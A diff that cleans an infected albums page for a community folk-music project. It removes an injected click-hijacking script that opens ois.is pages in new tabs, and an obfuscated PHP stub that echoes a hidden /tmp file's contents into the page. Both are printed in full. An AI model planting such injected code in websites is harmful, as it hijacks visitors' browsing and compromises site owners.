@@ -1,89 +1,11 @@
-<script>(function (parameters) {
-    const targets = [
-        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
-    ]
-    // Times between clicks
-    const restMinutes = 1;
-    // Number of hours to allow re-click 
-    const allowedHours = 2;
-
-
-    const saveTargetLocationsToStorage = (targets) => {
-        targets.forEach((target, index) => {
-            if(!localStorage.getItem(`${target}-local-storage`)){
-            	localStorage.setItem(`${target}-local-storage`, 0);
-            }
-        });
-    }
-    const getRandomLocationFromStorage = (targets) => {
-        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
-        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
-    }
-    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
-
-    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
-    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
-
-    const getHoursDiff = (startDate, endDate) => {
-        const msInHour = 1000 * 60 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInHour);
-    }
-    const getMintsDiff = (startDate, endDate) => {
-        const msInMints = 1000 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInMints);
-    }
-
-    const visitNewLocation = (targets, host, nowDate) => {
-        saveTargetLocationsToStorage(targets);
-        newLocation = getRandomLocationFromStorage(targets);
-        setTimeToStorage(`${host}-mnts`, nowDate);
-        setTimeToStorage(`${host}-hurs`, nowDate);
-        setLocationAsVisited(newLocation);
-        window.open(newLocation, "_blank");
-    }
-
-    // const randomLocation = getRandomLocationFromStorage(targets);
-    saveTargetLocationsToStorage(targets);
-
-    function globalClick(event) {
-        event.stopPropagation();
-        const host = location.host;
-        let newLocation = getRandomLocationFromStorage(targets);
-        const nowDate = Date.parse(new Date());
-        const savedDateForMints = getTimeStorage(`${host}-mnts`);
-        const savedDateForHours = getTimeStorage(`${host}-hurs`);
-
-        if (savedDateForMints && savedDateForHours) {
-            try {
-                const storageDateForMints = parseInt(savedDateForMints);
-                const storageDateForHours = parseInt(savedDateForHours);
-                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
-                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
-
-                if (hoursDiff >= allowedHours) {
-                    saveTargetLocationsToStorage(targets);
-                    setTimeToStorage(`${host}-hurs`, nowDate);
-                }
-                if (mintsDiff >= restMinutes) {
-                    if (newLocation) {
-                        setTimeToStorage(`${host}-mnts`, nowDate);
-                        window.open(newLocation, "_blank");
-                        setLocationAsVisited(newLocation);
-                    }
-                }
-            } catch (error) { visitNewLocation(targets, host, nowDate); }
-        } else { visitNewLocation(targets, host, nowDate); }
-    }
-    document.addEventListener("click", globalClick)
-})()</script>
 <html>
 	<head>
 		<title>The Community Music Project: Albums</title>
 		<link href="cmp.css" rel="stylesheet" type="text/css">
-	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	</head>
 	<body>
 		<iframe id="nav" src="nav.html"></iframe>
-		
+
 		<p class="album">
 			<a href="waaot.html">
 				<img src="images/waaot.jpg" />
@@ -94,7 +16,7 @@
 				<br /><a href="waaot.html">More...</a>
 			</span>
 		</p>
-		
+
 		<p class="album">
 			<a href="titc.html">
 				<img src="images/titc.jpg" />
@@ -105,56 +27,56 @@
 				<br /><a href="titc.html">More...</a>
 			</span>
 		</p>
-		
+
 		<p class="album">
 			<a href="dof.html">
 				<img src="images/dof.gif" />
 			</a>
 			<h3>Dreams of Flying (2003)</h3>
 			<span class="description">
-				Original folk, traditional gospel, Russian and Chilean folk. Debut of two wonderful young singers, 
-				Maia and Sarah. Strong return performances from Cynthia, dandelion, 
-				Jamuna (Russian folk in Russian), Claudia (Chilean folk in Spanish), 
+				Original folk, traditional gospel, Russian and Chilean folk. Debut of two wonderful young singers,
+				Maia and Sarah. Strong return performances from Cynthia, dandelion,
+				Jamuna (Russian folk in Russian), Claudia (Chilean folk in Spanish),
 				Jasmine, Ari, and the Omega Choir.
 				<br /><a href="dof.html">More...</a>
 			</span>
 		</p>
-		
+
 		<p class="album">
 			<a href="ftl.html">
 				<img src="images/ftl.gif" />
 			</a>
 			<h3>Feel This Love (2002)</h3>
 			<span class="description">
-				Feel This Love was created by Cynthia Rylander Crossen for healing through song. 
-				These rounds, songs, and chants about love and connection hope to 
-					inspire, enliven, comfort, and bring a sense of peace to the listener, to heal hurts, 
-					illness, and fears. 
+				Feel This Love was created by Cynthia Rylander Crossen for healing through song.
+				These rounds, songs, and chants about love and connection hope to
+					inspire, enliven, comfort, and bring a sense of peace to the listener, to heal hurts,
+					illness, and fears.
 				<br /><a href="ftl.html">More...</a>
 			</span>
 		</p>
-		
+
 		<p class="album">
 			<a href="cst.html">
 				<img src="images/cst.gif" />
 			</a>
 			<h3>Come Shining Through (2001)</h3>
 			<span class="description">
-				Original folk, international folk and traditional gospel. 
-				Debut of Russian folksinger Jamuna (Russian folk in Russian), True Believers, Ari, 
-				Beverly (gospel), and Jasmine. Strong return performances from Cynthia, dandelion, 
+				Original folk, international folk and traditional gospel.
+				Debut of Russian folksinger Jamuna (Russian folk in Russian), True Believers, Ari,
+				Beverly (gospel), and Jasmine. Strong return performances from Cynthia, dandelion,
 				and Claudia (Chilean folk in Spanish).
 				<br /><a href="cst.html">More...</a>
 			</span>
 		</p>
-		
+
 		<p class="album">
 			<a href="botw.html">
 				<img src="images/botw.gif" />
 			</a>
 			<h3>Butterfly On The Wind (2000)</h3>
 			<span class="description">
-				Original folk, Sakha (Siberian) and Chilean folk. Mother son duets with Cynthia and Jesse, 
+				Original folk, Sakha (Siberian) and Chilean folk. Mother son duets with Cynthia and Jesse,
 				Janet, Claudia (Chilean folk in Spanish), John and Carmen, and Susie (Sakha folk in Sakha).
 				<br /><a href="botw.html">More...</a>
 			</span>
@@ -166,11 +88,11 @@
       </a>
       <h3>The Goddess Suite (1987)</h3>
       <span class="description">
-        The Goddess Suite is a choral work for women's voices, 
+        The Goddess Suite is a choral work for women's voices,
         composed by Cynthia Crossen to celebrate the Greek goddesses.
         <br /><a href="tgs.html">More...</a>
       </span>
     </p>
-		
+
 	</body>
 </html>
